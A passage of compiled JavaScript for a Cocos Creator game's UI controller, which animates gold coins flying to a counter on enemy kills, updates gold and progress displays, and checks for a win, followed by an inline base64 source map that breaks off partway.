        if (enemy.goldIconFell < 5) {
            /** 每一个延迟0.1秒执行 */
            /** 随机一个方向 */
            var sub = GoldIconNodePos.sub(position);
            var center = position.add(sub.mul(0.15));
            var p = sub.normalize().rotate(-90 * Math.PI / 180);
            // let duration = sub.mag()/moveSpeed;
            var duration = 0.65;
            var bLeft = (Math.random() * 100) % 2 === 1;
            var _loop_1 = function (i) {
                var left = i % 2 === 0 ? bLeft : !bLeft;
                var goldIcon = this_1.getInactiveGoldIconNode();
                goldIcon.position = position;
                goldIcon.active = true;
                goldIcon.runAction(cc.speed(cc.sequence(cc.delayTime(i * 0.1), cc.bezierTo(duration, [
                    center.add(p.mul(300 * (left ? -1 : 1))),
                    GoldIconNodePos,
                    GoldIconNodePos
                ]).easing(cc.easeCircleActionIn()), cc.callFunc(function () {
                    goldIcon.active = false;
                    //加金币
                    if (!addFlag) {
                        addFlag = true;
                        GameProxy_1.GameProxy.goldCount += sigleGold + restGold;
                    }
                    else {
                        GameProxy_1.GameProxy.goldCount += sigleGold;
                    }
                    _this.updateGold();
                    _this.checkWin();
                })), 1));
            };
            var this_1 = this;
            for (var i = 0; i < enemy.goldIconFell; i++) {
                _loop_1(i);
            }
        }
        else {
            // console.log("Actions.boom===>");
            /** 像转盘一样炸开 */
            var radius = 80;
            var num = enemy.goldIconFell;
            Actions_1.default.boom(function () {
                var node = _this.getInactiveGoldIconNode();
                node.active = true;
                return node;
            }, position, GoldIconNodePos, radius, num, moveSpeed, function () {
                if (!addFlag) {
                    addFlag = true;
                    GameProxy_1.GameProxy.goldCount += sigleGold + restGold;
                }
                else {
                    GameProxy_1.GameProxy.goldCount += sigleGold;
                }
                _this.updateGold();
                _this.checkWin();
            });
        }
        this.updateGameProgress();
    };
    GameUIController.prototype.onInitGame = function () {
        this.lvLabels.forEach(function (value, index) { return value.string = "<b><outline color=#1e1e1e width=3>" + (GameProxy_1.GameProxy.level - 1 + index) + "</outline></b>"; });
        if (GameProxy_1.GameProxy.level < 2) {
            this.lvLabels[0].node.getParent().active = false;
        }
        this.updateGameProgress();
        this.updateGold();
    };
    GameUIController.prototype.onStartGame = function () {
        GoldIconNodePos = this.goldLayer.convertToNodeSpaceAR(this.goldIconNode.convertToWorldSpaceAR(cc.v2()));
    };
    GameUIController.prototype.updateGameProgress = function () {
        this.gameProgressBar.progress = GameProxy_1.GameProxy.killCount / GameProxy_1.GameProxy.maxEnemyNum;
        this.gameProgressLabel.string = "\u5269\u4F59\u654C\u4EBA\uFF1A" + Math.ceil(100 * (GameProxy_1.GameProxy.maxEnemyNum - GameProxy_1.GameProxy.killCount) / GameProxy_1.GameProxy.maxEnemyNum) + "%";
    };
    __decorate([
        property(cc.Node)
    ], GameUIController.prototype, "supplyIconNode", void 0);
    __decorate([
        property(cc.RichText)
    ], GameUIController.prototype, "lvLabels", void 0);
    __decorate([
        property(cc.ProgressBar)
    ], GameUIController.prototype, "gameProgressBar", void 0);
    __decorate([
        property(cc.Label)
    ], GameUIController.prototype, "gameProgressLabel", void 0);
    __decorate([
        property(cc.Label)
    ], GameUIController.prototype, "goldLabel", void 0);
    __decorate([
        property(cc.Node)
    ], GameUIController.prototype, "goldIconNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameUIController.prototype, "goldLayer", void 0);
    __decorate([
        property(cc.Node)
    ], GameUIController.prototype, "gameOverNode", void 0);
    GameUIController = __decorate([
        ccclass
    ], GameUIController);
    return GameUIController;
}(cc.Component));
exports.default = GameUIController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZVVJQ29udHJvbGxlci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EseUNBQXNDO0FBQ3RDLDJEQUFxRDtBQUNyRCw4REFBeUQ7QUFHbkQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFFMUMsSUFBSSxlQUFlLEdBQVcsSUFBSSxDQUFDO0FBR25DO0lBQThDLG9DQUFZO0lBQTFEO1FBQUEscUVBaUpDO1FBOUlHLG9CQUFjLEdBQVcsSUFBSSxDQUFDO1FBRzlCLGNBQVEsR0FBa0IsRUFBRSxDQUFDO1FBRzdCLHFCQUFlLEdBQWtCLElBQUksQ0FBQztRQUd0Qyx1QkFBaUIsR0FBWSxJQUFJLENBQUM7UUFHbEMsZUFBUyxHQUFZLElBQUksQ0FBQztRQUcxQixrQkFBWSxHQUFXLElBQUksQ0FBQztRQUc1QixlQUFTLEdBQVcsSUFBSSxDQUFDO1FBR3pCLGtCQUFZLEdBQVcsSUFBSSxDQUFDOztRQXdINUIsaUJBQWlCO0lBQ3JCLENBQUM7SUF2SFcsa0RBQXVCLEdBQS9CO1FBQ0ksSUFBSSxJQUFJLEdBQVcsSUFBSSxDQUFDLFNBQVMsQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLFVBQUEsS0FBSyxJQUFJLE9BQUEsS0FBSyxDQUFDLE1BQU0sSUFBSSxLQUFLLEVBQXJCLENBQXFCLENBQUMsQ0FBQztRQUNoRixJQUFJLElBQUksSUFBSSxJQUFJLEVBQUM7WUFDYixJQUFJLEdBQUcsRUFBRSxDQUFDLFdBQVcsQ0FBQyxJQUFJLENBQUMsWUFBWSxDQUFDLENBQUM7WUFDekMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7WUFDcEIsSUFBSSxDQUFDLFNBQVMsQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLENBQUM7U0FDakM7UUFDRCxJQUFJLENBQUMsT0FBTyxHQUFHLEdBQUcsQ0FBQztRQUNuQixJQUFJ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QUMscUJBQVMsQ0FBQyxXQUFXLEdBQUcscUJBQVMsQ0FBQyxTQUFTLENBQUMsR0FBQyxxQkFBUyxDQUFDLFdBQVcsQ0FBQyxNQUFHLENBQUE7SUFDbkksQ0FBQztJQTNJRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDOzREQUNZO0lBRzlCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUM7c0RBQ087SUFHN0I7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLFdBQVcsQ0FBQzs2REFDYTtJQUd0QztRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsS0FBSyxDQUFDOytEQUNlO0lBR2xDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUM7dURBQ087SUFHMUI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzswREFDVTtJQUc1QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO3VEQUNPO0lBR3pCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7MERBQ1U7SUF4QlgsZ0JBQWdCO1FBRHBDLE9BQU87T0FDYSxnQkFBZ0IsQ0FpSnBDO0lBQUQsdUJBQUM7Q0FqSkQsQUFpSkMsQ0FqSjZDLEVBQUUsQ0FBQyxTQUFTLEdBaUp6RDtrQkFqSm9CLGdCQUFnQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQge0dhbWVQcm94eX0gZnJvbSBcIi4vR2FtZVByb3h5XCI7XHJcbmltcG9ydCB7ZXh0fSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2V4dGVuZC9FeHRlbmRcIjtcclxuaW1wb3J0IEFjdGlvbnMgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9hY3Rpb25zL0FjdGlvbnNcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uL2luZm8vV29ybGRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxubGV0IEdvbGRJY29uTm9kZVBvczpjYy5WZWMyID0gbnVsbDtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEdhbWVVSUNvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgc3VwcGx5SWNvbk5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlJpY2hUZXh0KVxyXG4gICAgbHZMYWJlbHM6IFtjYy5SaWNoVGV4dF0gPSBbXTtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUHJvZ3Jlc3NCYXIpXHJcbiAgICBnYW1lUHJvZ3Jlc3NCYXI6Y2MuUHJvZ3Jlc3NCYXIgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIGdhbWVQcm9ncmVzc0xhYmVsOmNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICBnb2xkTGFiZWw6Y2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZ29sZEljb25Ob2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZ29sZExheWVyOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZ2FtZU92ZXJOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIHByaXZhdGUgZ2V0SW5hY3RpdmVHb2xkSWNvbk5vZGUoKTpjYy5Ob2Rle1xyXG4gICAgICAgIGxldCBub2RlOmNjLk5vZGUgPSB0aGlzLmdvbGRMYXllci5jaGlsZHJlbi5maW5kKHZhbHVlID0+IHZhbHVlLmFjdGl2ZSA9PSBmYWxzZSk7XHJcbiAgICAgICAgaWYgKG5vZGUgPT0gbnVsbCl7XHJcbiAgICAgICAgICAgIG5vZGUgPSBjYy5pbnN0YW50aWF0ZSh0aGlzLmdvbGRJY29uTm9kZSk7XHJcbiAgICAgICAgICAgIG5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgIHRoaXMuZ29sZExheWVyLmFkZENoaWxkKG5vZGUpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBub2RlLm9wYWNpdHkgPSAyNTU7XHJcbiAgICAgICAgbm9kZS5zY2FsZSA9IDAuNztcclxuICAgICAgICByZXR1cm4gbm9kZTtcclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVHb2xkKCl7XHJcbiAgICAgICAgdGhpcy5nb2xkTGFiZWwuc3RyaW5nID0gZXh0LnNob3J0Rm9ybWF0KEdhbWVQcm94eS5nb2xkQ291bnQpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uTG9hZCAoKSB7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9uKEdhbWVQcm94eS5FdmVudC5LaWxsRW5lbXksIHRoaXMub25LaWxsRW5lbXksIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vbihHYW1lUHJveHkuRXZlbnQuSW5pdEdhbWUsIHRoaXMub25Jbml0R2FtZSwgdGhpcyk7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9uKEdhbWVQcm94eS5FdmVudC5TdGFydEdhbWUsIHRoaXMub25TdGFydEdhbWUsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMuc3VwcGx5SWNvbk5vZGUucnVuQWN0aW9uKGNjLnJlcGVhdEZvcmV2ZXIoY2Muc2VxdWVuY2UoY2Muc2NhbGVUbygwLjM1LCAwLjkxKSwgY2Muc2NhbGVUbygwLjM1LCAxKSkpKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRlc3Ryb3koKXtcclxuICAgICAgICB0aGlzLm5vZGUub2ZmKEdhbWVQcm94eS5FdmVudC5LaWxsRW5lbXksIHRoaXMub25LaWxsRW5lbXksIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vZmYoR2FtZVByb3h5LkV2ZW50LkluaXRHYW1lLCB0aGlzLm9uSW5pdEdhbWUsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5vZmYoR2FtZVByb3h5LkV2ZW50LlN0YXJ0R2FtZSwgdGhpcy5vblN0YXJ0R2FtZSwgdGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgY2hlY2tXaW4oKXtcclxuICAgICAgICBpZiAoR2FtZVByb3h5LmlzT3ZlciAmJiBHYW1lUHJveHkua2lsbENvdW50ID49IEdhbWVQcm94eS5tYXhFbmVteU51bSAmJiB0aGlzLmdvbGRMYXllci5jaGlsZHJlbi5ldmVyeSh2YWx1ZSA9PiB2YWx1ZS5hY3RpdmUgPT0gZmFsc2UpKXtcclxuICAgICAgICAgICAgY29uc29sZS5sb2coXCLph5HluIHpo57lrozkuobvvIznu5PnrpdcIik7XHJcbiAgICAgICAgICAgIHRoaXMuZ2FtZU92ZXJOb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIG9uS2lsbEVuZW15KGVuZW15KXtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhcIj09PT09PW9uS2lsbEVuZW15PT09PT5cIik7XHJcbiAgICAgICAgLyoqIOWIhumFjemHkeW4gSAqL1xyXG4gICAgICAgIGxldCB0b3RhbEdvbGQgPSBlbmVteS5nb2xkICogR2FtZVByb3h5LmdvbGRNdWw7XHJcbiAgICAgICAgbGV0IHNpZ2xlR29sZCA9IE1hdGguZmxvb3IodG90YWxHb2xkL2VuZW15LmdvbGRJY29uRmVsbCk7XHJcbiAgICAgICAgbGV0IHJlc3RHb2xkID0gdG90YWxHb2xkIC0gc2lnbGVHb2xkICogZW5lbXkuZ29sZEljb25GZWxsO1xyXG4gICAgICAgIGxldCBhZGRGbGFnID0gZmFsc2U7XHJcbiAgICAgICAgbGV0IG1vdmVTcGVlZCA9IDEwMDA7XHJcbiAgICAgICAgLyoqIOmjnumHkeW4gSAqL1xyXG4gICAgICAgIGxldCBwb3NpdGlvbiA9IGVuZW15Lm5vZGUucG9zaXRpb24uYWRkKGVuZW15Lm5vZGUuZ2V0UGFyZW50KCkuZ2V0UGFyZW50KCkucG9zaXRpb24pO1xyXG4gICAgICAgIGlmIChlbmVteS5nb2xkSWNvbkZlbGwgPCA1KXtcclxuICAgICAgICAgICAgLyoqIOavj+S4gOS4quW7tui/nzAuMeenkuaJp+ihjCAqL1xyXG4gICAgICAgICAgICAvKiog6ZqP5py65LiA5Liq5pa55ZCRICovXHJcbiAgICAgICAgICAgIGxldCBzdWIgPSBHb2xkSWNvbk5vZGVQb3Muc3ViKHBvc2l0aW9uKTtcclxuICAgICAgICAgICAgbGV0IGNlbnRlciA9IHBvc2l0aW9uLmFkZChzdWIubXVsKDAuMTUpKTtcclxuICAgICAgICAgICAgbGV0IHAgPSBzdWIubm9ybWFsaXplKCkucm90YXRlKC05MCpNYXRoLlBJLzE4MCk7XHJcbiAgICAgICAgICAgIC8vIGxldCBkdXJhdGlvbiA9IHN1Yi5tYWcoKS9tb3ZlU3BlZWQ7XHJcbiAgICAgICAgICAgIGxldCBkdXJhdGlvbiA9IDAuNjU7XHJcbiAgICAgICAgICAgIGxldCBiTGVmdCA9IChNYXRoLnJhbmRvbSgpKjEwMCklMiA9PT0gMTtcclxuICAgICAgICAgICAgZm9yIChsZXQgaT0wOyBpPGVuZW15LmdvbGRJY29uRmVsbDsgaSsrKXtcclxuICAgICAgICAgICAgICAgIGxldCBsZWZ0ID0gaSUyID09PSAwID8gYkxlZnQgOiAhYkxlZnQ7XHJcbiAgICAgICAgICAgICAgICBsZXQgZ29sZEljb24gPSB0aGlzLmdldEluYWN0aXZlR29sZEljb25Ob2RlKCk7XHJcbiAgICAgICAgICAgICAgICBnb2xkSWNvbi5wb3NpdGlvbiA9IHBvc2l0aW9uO1xyXG4gICAgICAgICAgICAgICAgZ29sZEljb24uYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgIGdvbGRJY29uLnJ1bkFjdGlvbihjYy5zcGVlZChjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoaSowLjEpLCBjYy5iZXppZXJUbyhkdXJhdGlvbiwgW1xyXG4gICAgICAgICAgICAgICAgICAgIGNlbnRlci5hZGQocC5tdWwoMzAwKihsZWZ0Py0xOjEpKSksXHJcbiAgICAgICAgICAgICAgICAgICAgR29sZEljb25Ob2RlUG9zLFxyXG4gICAgICAgICAgICAgICAgICAgIEdvbGRJY29uTm9kZVBvc1xyXG4gICAgICAgICAgICAgICAgXSkuZWFzaW5nKGNjLmVhc2VDaXJjbGVBY3Rpb25JbigpKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICBnb2xkSWNvbi5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAvL+WKoOmHkeW4gVxyXG4gICAgICAgICAgICAgICAgICAgIGlmICghYWRkRmxhZyl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFkZEZsYWcgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBHYW1lUHJveHkuZ29sZENvdW50ICs9IHNpZ2xlR29sZCArIHJlc3RHb2xkO1xyXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIEdhbWV